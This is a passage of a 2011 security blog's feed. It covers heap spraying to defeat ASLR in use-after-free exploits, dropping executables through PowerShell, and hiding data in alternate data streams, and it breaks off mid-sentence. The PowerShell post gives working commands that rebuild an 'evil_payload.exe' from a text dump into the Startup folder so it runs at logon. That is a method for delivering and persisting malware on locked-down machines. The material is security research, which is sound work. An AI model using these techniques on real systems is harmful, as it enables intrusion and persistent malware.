&lt;/span&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80070&lt;span&gt;&amp;nbsp; &lt;/span&gt;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41&lt;span&gt;&amp;nbsp; &lt;/span&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="font-family: inherit; text-align: justify;"&gt;&lt;span style="font-size: small;"&gt;&lt;span&gt;You can clearly see the string length at offset 0x20 – 000fffda which is the length of the string minus the null terminator.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;span style="font-family: inherit; font-size: small;"&gt;  &lt;/span&gt;&lt;div class="MsoNoSpacing" style="font-family: inherit; text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="font-family: inherit; text-align: justify;"&gt;  &lt;span style="font-size: small;"&gt;&lt;span style="line-height: 115%;"&gt;Another way to analyze your heap allocations is through the fragmentation view of VMmap – one of many incredibly useful tools in the Sysinternals suite. The following image shows an allocation of 1000MB. Within the fragmentation view you can zoom in and click on individual allocations and confirm that each heap allocation (in orange) begins at an address in the form of 0xXXXX0000.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://3.bp.blogspot.com/-yZBvHmUyRLs/Tlumwynul5I/AAAAAAAAAB4/JuJFYqp3c2g/s1600/fragmentation.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="640" src="http://3.bp.blogspot.com/-yZBvHmUyRLs/Tlumwynul5I/AAAAAAAAAB4/JuJFYqp3c2g/s640/fragmentation.png" width="440" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class="MsoNoSpacing" style="font-family: inherit; text-align: justify;"&gt;&lt;span&gt;&lt;br /&gt;&lt;/span&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;o:OfficeDocumentSettings&gt;   &lt;o:RelyOnVML&gt;&lt;/o:RelyOnVML&gt;   &lt;o:AllowPNG&gt;&lt;/o:AllowPNG&gt;  &lt;/o:OfficeDocumentSettings&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;w:WordDocument&gt;   &lt;w:View&gt;Normal&lt;/w:View&gt;   &lt;w:Zoom&gt;0&lt;/w:Zoom&gt;   &lt;w:TrackMoves&gt;&lt;/w:TrackMoves&gt;   &lt;w:TrackFormatting&gt;&lt;/w:TrackFormatting&gt;   &lt;w:PunctuationKerning&gt;&lt;/w:PunctuationKerning&gt;   &lt;w:ValidateAgainstSchemas&gt;&lt;/w:ValidateAgainstSchemas&gt;   &lt;w:SaveIfXMLInvalid&gt;false&lt;/w:SaveIfXMLInvalid&gt;   &lt;w:IgnoreMixedContent&gt;false&lt;/w:IgnoreMixedContent&gt;   &lt;w:AlwaysShowPlaceholderText&gt;false&lt;/w:AlwaysShowPlaceholderText&gt;   &lt;w:DoNotPromoteQF&gt;&lt;/w:DoNotPromoteQF&gt;   &lt;w:LidThemeOther&gt;EN-US&lt;/w:LidThemeOther&gt;   &lt;w:LidThemeAsian&gt;X-NONE&lt;/w:LidThemeAsian&gt;   &lt;w:LidThemeComplexScript&gt;X-NONE&lt;/w:LidThemeComplexScript&gt;   &lt;w:Compatibility&gt;    &lt;w:BreakWrappedTables&gt;&lt;/w:BreakWrappedTables&gt;    &lt;w:SnapToGridInCell&gt;&lt;/w:SnapToGridInCell&gt;    &lt;w:WrapTextWithPunct&gt;&lt;/w:WrapTextWithPunct&gt;    &lt;w:UseAsianBreakRules&gt;&lt;/w:UseAsianBreakRules&gt;    &lt;w:DontGrowAutofit&gt;&lt;/w:DontGrowAutofit&gt;    &lt;w:SplitPgBreakAndParaMark&gt;&lt;/w:SplitPgBreakAndParaMark&gt;    &lt;w:EnableOpenTypeKerning&gt;&lt;/w:EnableOpenTypeKerning&gt;    &lt;w:DontFlipMirrorIndents&gt;&lt;/w:DontFlipMirrorIndents&gt;    &lt;w:OverrideTableStyleHps&gt;&lt;/w:OverrideTableStyleHps&gt;   &lt;/w:Compatibility&gt;   &lt;m:mathPr&gt;    &lt;m:mathFont m:val="Cambria Math"/&gt;    &lt;m:brkBin m:val="before"/&gt;    &lt;m:brkBinSub m:val="&amp;#45;-"/&gt;    &lt;m:smallFrac m:val="off"/&gt;    &lt;m:dispDef&gt;&lt;/m:dispDef&gt;    &lt;m:lMargin m:val="0"/&gt;    &lt;m:rMargin m:val="0"/&gt;    &lt;m:defJc m:val="centerGroup"/&gt;    &lt;m:wrapIndent m:val="1440"/&gt;    &lt;m:intLim m:val="subSup"/&gt;    &lt;m:naryLim m:val="undOvr"/&gt;   &lt;/m:mathPr&gt;&lt;/w:WordDocument&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="true"
  DefSemiHidden="true" DefQFormat="false" DefPriority="99"
  LatentStyleCount="267"&gt;   &lt;w:LsdException Locked="false" Priority="0" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Normal"/&gt;   &lt;w:LsdException Locked="false" Priority="9" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="heading 1"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 2"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 3"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 4"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 5"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 6"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 7"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 8"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 9"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 1"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 2"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 3"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 4"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 5"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 6"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 7"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 8"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 9"/&gt;   &lt;w:LsdException Locked="false" Priority="35" QFormat="true" Name="caption"/&gt;   &lt;w:LsdException Locked="false" Priority="10" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Title"/&gt;   &lt;w:LsdException Locked="false" Priority="1" Name="Default Paragraph Font"/&gt;   &lt;w:LsdException Locked="false" Priority="11" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtitle"/&gt;   &lt;w:LsdException Locked="false" Priority="22" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Strong"/&gt;   &lt;w:LsdException Locked="false" Priority="20" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="59" SemiHidden="false"
   UnhideWhenUsed="false" Name="Table Grid"/&gt;   &lt;w:LsdException Locked="false" UnhideWhenUsed="false" Name="Placeholder Text"/&gt;   &lt;w:LsdException Locked="false" Priority="1" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="No Spacing"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" UnhideWhenUsed="false" Name="Revision"/&gt;   &lt;w:LsdException Locked="false" Priority="34" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="List Paragraph"/&gt;   &lt;w:LsdException Locked="false" Priority="29" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Quote"/&gt;   &lt;w:LsdException Locked="false" Priority="30" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Quote"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="19" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtle Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="21" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="31" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtle Reference"/&gt;   &lt;w:LsdException Locked="false" Priority="32" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Reference"/&gt;   &lt;w:LsdException Locked="false" Priority="33" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Book Title"/&gt;   &lt;w:LsdException Locked="false" Priority="37" Name="Bibliography"/&gt;   &lt;w:LsdException Locked="false" Priority="39" QFormat="true" Name="TOC Heading"/&gt;  &lt;/w:LatentStyles&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 10]&gt; &lt;style&gt;
 /* Style Definitions */
 table.MsoNormalTable
	{mso-style-name:"Table Normal";
	mso-tstyle-rowband-size:0;
	mso-tstyle-colband-size:0;
	mso-style-noshow:yes;
	mso-style-priority:99;
	mso-style-parent:"";
	mso-padding-alt:0in 5.4pt 0in 5.4pt;
	mso-para-margin-top:0in;
	mso-para-margin-right:0in;
	mso-para-margin-bottom:10.0pt;
	mso-para-margin-left:0in;
	line-height:115%;
	mso-pagination:widow-orphan;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	mso-ascii-font-family:Calibri;
	mso-ascii-theme-font:minor-latin;
	mso-hansi-font-family:Calibri;
	mso-hansi-theme-font:minor-latin;
	mso-bidi-font-family:"Times New Roman";
	mso-bidi-theme-font:minor-bidi;}
&lt;/style&gt; &lt;![endif]--&gt;&lt;span style="font-size: small;"&gt;&lt;span&gt;So why is this technique so useful? This method of heap spraying is perfect when exploiting use-after-free vulnerabilities where an attacker can craft fake objects and vtable structures. A fake vtable pointer can then point to an address in the heap range – 0x11F50024 just as an example. Thus, there is no need to rely upon nops and no need to worry about EMET’s arbitrary prevention of executing 0x0C0C0C0C-style addresses. For all intents and purposes, you’ve completely bypassed ASLR protections.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-5391545886505722735?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Mon, 29 Aug 2011 15:01:00 +0000</pubDate></item><item><title>Dropping Executables with Powershell</title><link>http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html</link><description>&lt;div style="text-align: justify;"&gt;Scenario: You find yourself in a limited Windows user environment without the ability to transfer binary files over the network for one reason or another. So this rules out using a browser, ftp.exe, mspaint (yes, mspaint can be used to transfer binaries), etc. for file transfer. Suppose this workstation isn't even connected to the Internet. What existing options do you have to drop binaries on the target machine? There's the tried and true debug.exe method of assembling a text file with your payload. This method limits the size of your executable to 64K however since debug.exe is a 16-bit application. Also, Microsoft has since removed debug from recent versions of Windows. Also, Didier Stevens showed how easy it to embed executables in PDFs[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#7_1"&gt;1&lt;/a&gt;]. You can convert executables to VBscript and embed in Office documents as well. These apps won't necessarily be installed on every machine. Fortunately, Starting with Windows 7 and Server 2008, Powershell is installed by default.&lt;br /&gt;&lt;br /&gt;Because Powershell implements the .NET framework, you have an incredible amount of power at your fingertips. I will demonstrate one use case whereby you can create an executable from a text file consisting of a hexadecimal representation of an executable. You can generate this text file using any compiled/scripting language you wish but since we're on the topic, I'll show you how to generate it in Powershell:&lt;/div&gt;&lt;br /&gt;&lt;span&gt;PS &amp;gt; [byte[]] $hex = get-content -encoding byte -path C:\temp\evil_payload.exe&lt;/span&gt;&lt;br /&gt;&lt;span&gt;PS &amp;gt; [System.IO.File]::WriteAllLines("C:\temp\hexdump.txt", ([string]$hex))&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;The first line reads in each byte of an executable and saves them to a byte array. The second line casts the bytes in the array as strings and writes them to a text file. The resultant text file will look something like this:&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;&lt;span&gt;77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 232 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 0 124 58 138 68 29 84 217 68 29 84 217 68 29 84 217 99 219 41 217 66 29 84 217 99 219 47 217 79 29 84 217 68 29 85 217 189 29 84 217 99 219 58 217 71 29 84 217 99 219 57 217 125 29 84 217 99 219 40 217 69 29 84 217 99 219 44 217 69 29 84 217 82 105 99 104 68 29 84 217 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ...&lt;/span&gt;&lt;/div&gt;&lt;br /&gt;You can see that each byte is represented as a decimal (77,90 = "MZ").&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;Next, once you get the text file onto the target machine (a teensy/USB HID device would be an ideal use case), Powershell can be used to reconstruct the executable from the text file using the following lines:&lt;/div&gt;&lt;br /&gt;&lt;span&gt;PS &amp;gt; [string]$hex = get-content -path C:\Users\victim\Desktop\hexdump.txt&lt;/span&gt;&lt;br /&gt;&lt;span&gt;PS &amp;gt; [Byte[]] $temp = $hex -split ' '&lt;/span&gt;&lt;br /&gt;&lt;span&gt;PS &amp;gt; [System.IO.File]::WriteAllBytes("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\evil_payload.exe", $temp)&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;The first line reads the hex dump into a string variable. The string is then split into a byte array using &amp;lt;space&amp;gt; as a delimiter. Finally, the byte array is written back to a file and thus, the original executable is recreated.&lt;br /&gt;&lt;br /&gt;While writing this article, I stumbled upon Dave Kennedy and Josh Kelley's work with Powershell[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#7_2"&gt;2&lt;/a&gt;] where they stumbled upon this same method of generating executables. In fact several Metasploit payloads use a similar, albeit slicker method of accomplishing this using compression and base64 encoding. Please do check out the great work they've been doing with Powershell.&lt;/div&gt;&lt;br /&gt;&lt;a name="7_1"&gt;&lt;/a&gt;1. Didier Stevens, "Embedding and Hiding Files in PDF Documents," July 1, 2009, &lt;a href="http://blog.didierstevens.com/2009/07/01/embedding-and-hiding-files-in-pdf-documents/"&gt;http://blog.didierstevens.com/2009/07/01/embedding-and-hiding-files-in-pdf-documents/&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;a name="7_2"&gt;&lt;/a&gt;2. Dave Kennedy and Josh Kelley "Defcon 18 PowerShell OMFG…", August 31, 2010, &lt;a href="http://www.secmaniac.com/august-2010/powershell_omfg/"&gt;http://www.secmaniac.com/august-2010/powershell_omfg/&lt;/a&gt;&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-790343886359711055?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Wed, 14 Sep 2011 22:51:00 +0000</pubDate></item><item><title>Stealth Alternate Data Streams and Other ADS Weirdness</title><link>http://www.exploit-monday.com/2011/09/stealth-alternate-data-streams-and.html</link><description>&lt;div style="text-align: justify;"&gt;I was reading an article on MSDN regarding the naming of files, paths, and namespaces[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#8_1"&gt;1&lt;/a&gt;] and I discovered some interesting peculiarities regarding the naming and creation of certain files containing alternate data streams.&lt;br /&gt;&lt;br /&gt;I started by playing around with naming files based upon reserved device names "CON, PRN, AUX, NUL, COM1, LPT1, etc." As an example:&lt;/div&gt;&lt;br /&gt;&lt;span&gt;C:\temp&amp;gt;echo hi &amp;gt; \\?\C:\temp\NUL&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;Note that this file can only be created when the prefix "\\?\" or 